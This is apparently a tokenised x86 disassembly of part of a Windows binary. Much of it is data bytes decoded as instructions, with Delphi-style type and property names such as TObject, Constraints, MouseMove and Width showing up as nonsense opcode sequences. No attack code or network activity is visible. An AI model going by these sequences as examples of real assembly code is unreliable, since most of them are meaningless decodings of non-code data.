add [ eax + 0x700044f2 ] ch
or [ edx ] al
insd
inc ebx
outsd
outsb
je r-xdata
xor ch dh
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push 0xe80044b2
popfd
inc esp
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov ah 0xf3
inc esp
add [ 0xfffffffff43c0044 ] dl
inc esp
add [ 0xffffffffa5500044 ] bh
inc esp
add [ eax ] dl
test [ eax + eax - 0x7c ] 0xf4
inc esp
add [ ebp - 0x5a5fffbc ] cl
inc esp
add ah bh
hlt
outsd
insb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xb3
inc esp
add [ eax + eax ] bl
add [ eax ] al
adc [ esi + 0x48980044 ] bl
sub_44b1c6
inc esp
add [ edi + ebx * 4 ] ah
inc ecx
add [ edi + ebx * 4 ] ch
inc ecx
add [ eax - 0x62 ] al
inc ecx
add [ eax + ebx * 2 + 0x42 ] bh
add [ eax + 0x58 ] ch
inc edx
add [ eax + esi * 8 + 0x44 ] ah
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
dec eax
inc eax
add al ch
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
movsb [ edi ] [ esi ]
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
je r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + 0x44 ] cl
add [ esi + 0x3540044 ] bl
inc edx
add [ eax - 0x62 ] al
inc ecx
add [ esp + eax ] ch
inc edx
add [ ecx + ecx - 0x60afffbe ] dl
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax + 0x7 ] ch
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add al bh
movsd [ edi ] [ esi ]
inc esp
add [ edx + ecx + 0x42 ] dl
add al bh
or [ edx ] eax
mov [ ecx ] cs
inc edx
add [ ecx + ecx + 0x9900042 ] bh
inc edx
add [ eax - 0x5667ffbc ] ah
inc esp
add [ eax ] dh
test eax 0xac700044
inc esp
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
add [ eax + eax + 0x48ac0042 ] cl
inc eax
add [ eax - 0x17ffbfb8 ] ah
jae r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + ecx ] bh
inc edx
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
insd
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
hlt
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
fdiv [ edx + 0x14070044 ]
push esp
inc ebx
jne r-xdata
inc esp
add [ eax + ecx - 0xa1bffbe ] ah
inc esp
add ah dh
pop es
inc edx
add [ eax - 0x23ffbdf8 ] cl
or [ edx ] al
inc esp
add [ eax + 0x8 ] dh
inc edx
add [ eax ] dh
cmc
je r-xdata
add [ eax + 0x700044f2 ] ch
or [ edx ] al
insd
inc ebx
outsd
outsb
je r-xdata
xor ch dh
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push 0xe80044b2
popfd
inc esp
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov ah 0xf3
inc esp
add [ 0xfffffffff43c0044 ] dl
inc esp
add [ 0xffffffffa5500044 ] bh
inc esp
add [ eax ] dl
test [ eax + eax - 0x7c ] 0xf4
inc esp
add [ ebp - 0x5a5fffbc ] cl
inc esp
add ah bh
hlt
outsd
insb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xb3
inc esp
add [ eax + eax ] bl
add [ eax ] al
adc [ esi + 0x48980044 ] bl
sub_44b396
inc esp
add al cl
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0xb ] bl
inc esp
add al dl
movsd [ edi ] [ esi ]
inc esp
add [ ebp + esi * 8 + 0x44 ] bh
add al bl
movsd [ edi ] [ esi ]
inc esp
add [ eax + 0x780044f6 ] bl
test [ eax + eax - 0x48 ] 0xf6
inc esp
add [ eax - 0x13ffbb0b ] ah
movsd [ edi ] [ esi ]
inc esp
add al dh
movsd [ edi ] [ esi ]
inc esp
add ah al
cmc
inc esp
add [ eax ] ch
hlt
sub_44b7de
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
je r-xdata
add [ eax ] dl
add [ eax ] al
[ ebp + ebx * 8 + 0x45 ]
mov bh 0x44
add [ eax + eax ] cl
add bh bh
insb
fld [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] eax
add edx [ edi + ebp * 2 + 0x70 ]
and [ edi + 0x100044 ] dh
add bh bh
insb
fld [ ebp ]
add [ eax ] eax
add [ eax ] al
add al [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al [ eax ]
add eax 0x68676952
je r-xdata
lea eax [ eax ]
mov al [ 0x44b8 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
mov eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x200044b8
add [ eax ] al
add [ edi + esi * 4 ] bh
inc esp
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + ebx * 4 ] dl
inc ecx
add al dh
fadd [ ebp ]
sub al 0x9f
inc ecx
add [ eax - 0x62 ] al
inc ecx
add [ eax ] bh
fld [ ebp ]
mov al 0xde
inc ebp
add [ eax + 0x45 ] dh
add [ esp + ebx * 8 + 0x54080045 ] ch
push eax
popad
imul ebp [ fs : esi + 0x67 ] 0xcc00408d
mov eax 0x8070044
push esp
push eax
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
mov al 0xb7
inc esp
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
mov bh 0x44
add [ eax + eax ] dl
add bh bh
insb
fld [ ebp ]
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
push es
inc edx
outsd
je r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
inc edx
outsd
je r-xdata
outsd
insb
jae r-xdata
outsb
lea eax [ bx + si ]
int3
outsd
insd
adc [ eax ] al
cmp al 0x10
outsd
insd
lea eax [ eax ]
jo r-xdata
add [ eax ] cl
add [ eax ] al
[ ebp + ebx * 8 + 0x45 ]
add [ eax ] ah
mov bh 0x44
pop es
or [ esi ] al
push ebx
outsb
jb r-xdata
dec ebp
outsd
jbe r-xdata
jo r-xdata
inc esp
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
jne r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
popad
je r-xdata
inc ebp
jbe r-xdata
mov bh 0x44
add [ eax + eax ] dl
add bh bh
insb
fld [ ebp ]
add [ eax ] eax
add [ eax ] al
mov bh 0x44
add [ eax ] dl
add [ eax ] al
[ ebp + ebx * 8 + 0x45 ]
jne r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
je r-xdata
jb r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
inc eax
add [ ebx + 0x44b9e8c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
or [ esi ] cl
push esp
dec ebx
jns r-xdata
jbe r-xdata
or [ esi + 0x41 ] ch
outsb
or al 0x54
dec ebp
outsd
or eax 0x73756f4d
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add [ ebx ] eax
outsb
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] bh
inc edx
popad
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx + edx ] dl
push cs
push esp
dec ebp
outsd
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
add [ ecx + edx ] dl
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
inc ebx
push 0x14007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x4473ffc0 ] cl
inc esp
add [ eax ] cl
push cs
push esp
add ecx [ eax ]
push es
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
cmp [ esp + eax * 2 + r-xdata ] dh
je r-xdata
jb r-xdata
inc eax
add [ eax + 0x10 ] ch
add [ ecx + edx ] dl
add [ eax + r-xdata ] dl
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ ecx ] al
push esp
push ebx
dec ebp
outsd
jne r-xdata
je r-xdata
push ebx
push 0xb746669
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
outsb
add [ ecx + edx ] dl
inc eax
add [ ecx + edx ] dl
dec edi
jbe r-xdata
add [ ebx ] eax
dec ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
adc [ eax ] al
outsb
add [ 0x66696853 ] al
je r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
inc eax
add [ eax ] cl
outsb
inc ecx
add [ ecx + edx ] dl
inc eax
add al bh
mov bl 0x44
add [ eax ] cl
outsb
inc ecx
push 0xb746669
jb r-xdata
jne r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
jb r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
jb r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
adc al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
mov ah 0x44
add [ ebp - 0x44fbffc0 ] cl
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
inc edx
jne r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
pop es
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
pop es
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
inc esp
jb r-xdata
jns r-xdata
jb r-xdata
add al 0xbb
je r-xdata
push ebx
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
je r-xdata
je r-xdata
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add ah ah
mov ah 0x44
add [ eax ] al
adc [ eax ] al
nop
adc al 0xbc
inc esp
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
adc al 0x11
inc eax
add [ eax ] cl
outsb
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x45b3ffc0 ] cl
inc esp
add [ eax ] cl
adc edx [ ebp + ecx * 2 + 0x6f ]
jne r-xdata
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
adc al 0x11
inc eax
add [ eax + 0x3c0044b0 ] dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ ebp - 0x42c7ffc0 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
adc al 0x11
inc eax
add [ ecx + edx ] dl
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add al dl
mov esp 0xe080044
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
jb r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
outsb
je r-xdata
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
push ebx
outsb
jb r-xdata
outsb
je r-xdata
push ebx
outsb
jb r-xdata
jb r-xdata
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
popad
outsb
add [ ecx + edx ] dl
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x438bffc0 ] cl
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
adc al 0x11
inc eax
add [ ecx + edx ] dl
inc eax
add [ eax + edx ] bh
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
push esp
popad
jb r-xdata
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
jb r-xdata
push ebx
outsb
add al 0x8
push es
pop es
dec eax
imul esi [ esp + edx * 2 + 0x65 ] 0x49077473
outsb
je r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
jns r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ eax + 0x3c0044b0 ] dh
adc [ eax ] al
cmp al 0x10
inc eax
add ah ah
mov ah 0x44
add [ eax ] al
adc [ eax ] al
nop
enter 0x44bd 0x0
adc al 0x11
outsb
je r-xdata
jbe r-xdata
inc ebp
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
je r-xdata
jb r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
push 0x65
popad
jb r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
adc al 0x11
inc eax
add al bh
mov bl 0x44
add [ eax ] cl
outsb
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
jne r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
or al 0xbf
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
xor ah al
inc esp
add [ eax ] al
outsb
je r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x14 ] si
adc [ eax ] eax
mov al 0xb0
inc esp
add [ eax + 0x80044be ] al
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ ecx + edx ] dl
inc eax
add [ eax ] dh
les eax [ eax + eax + 0x48 ]
int3
inc edx
outsd
outsd
insb
popad
outsb
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x44c00cc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
inc eax
add [ eax ] dh
les eax [ eax + eax ]
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x44c094c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
xchg esp eax
rol [ eax + eax + 0x8 ] 0x16
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x3e ] dl
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
adc al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
jl r-xdata
inc ebp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax ] al
dec eax
add [ ecx ] sub_420750
movsb [ edi ] [ esi ]
dec eax
inc eax
add [ eax + eax + 0x48ac0042 ] cl
inc eax
add al bh
push ds
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
add [ eax ] cl
add [ eax + 0x7 ] dl
inc edx
add [ eax + ecx * 2 + 0x8c0040 ] ah
inc edx
add [ eax + ecx * 2 + 0x1ef80040 ] ch
jo r-xdata
add [ eax - 0x7f ] cl
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
inc eax
add [ eax ] cl
outsb
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
arpl [ ecx + eax + 0x8 ] si
push 0x65
jb r-xdata
lea eax [ eax ]
lodsb [ esi ]
rol [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xc2
inc esp
add [ esp + eax * 8 ] dh
inc esp
add [ eax ] al
jbe r-xdata
add [ esi ] ah
les eax [ eax + eax - 0x70 ]
add [ eax ] eax
outsb
je r-xdata
add al 0x8
push es
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
inc eax
add [ eax ] cl
outsb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or cl al
inc esp
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
add ah dh
test [ eax + eax - 0x10 ] 0xf400452f
and [ ebp ] eax
inc eax
sahf
inc ecx
add [ eax - 0x3fffbad1 ] bh
sti
inc esp
add [ ebx + edi * 8 ] ch
inc esp
add [ esi + eax + 0x45 ] bh
add [ eax + 0x7 ] ch
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add ah bh
test [ eax + eax + 0x1c ] 0x19
inc ebp
add [ eax ] bl
sbb [ ebp ] eax
call 0x7c450702
stc
inc esp
add [ edx + eax + 0x1f80045 ] dl
inc ebp
add [ eax - 0x43ffbaf5 ] bh
clc
inc esp
add al al
clc
inc esp
add [ eax - 0x4bffbacf ] cl
xor [ ebp ] eax
cld
cli
inc esp
add [ eax + 0x6 ] ah
inc ebp
add al bh
cli
inc esp
add ah ch
pop es
inc ebp
add [ eax + 0x7 ] ch
inc ebp
add [ eax + 0x2800450a ] al
or [ ebp ] eax
sub [ eax * 2 + 0x4531f800 ] bl
add [ eax + 0xd ] bh
inc ebp
add [ eax + 0xe ] ch
inc ebp
add [ eax ] al
std
inc esp
add [ esi + ecx + 0x45 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x840040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop esp
add [ eax ] eax
add [ ebp ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x8b04bb0
mov al 0x35
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_44c488
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c040003 ] al
je r-xdata
push r-xdata
dec esp
add [ eax ] al
adc [ eax ] al
inc esp
add [ eax ] al
[ eax - 0x1 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54030004 ] al
outsd
jo r-xdata
add [ eax + eax ] bh
jmp [ edx + ecx + 0x10045 ]
imul esp [ edi + 0x68 ] 0x44ad1c74
adc [ eax ] al
dec eax
add [ eax ] al
dec [ edi + edi * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69570500
je r-xdata
[ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] eax
or [ eax + 0x65 ] cl
insb
jo r-xdata
inc eax
inc [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
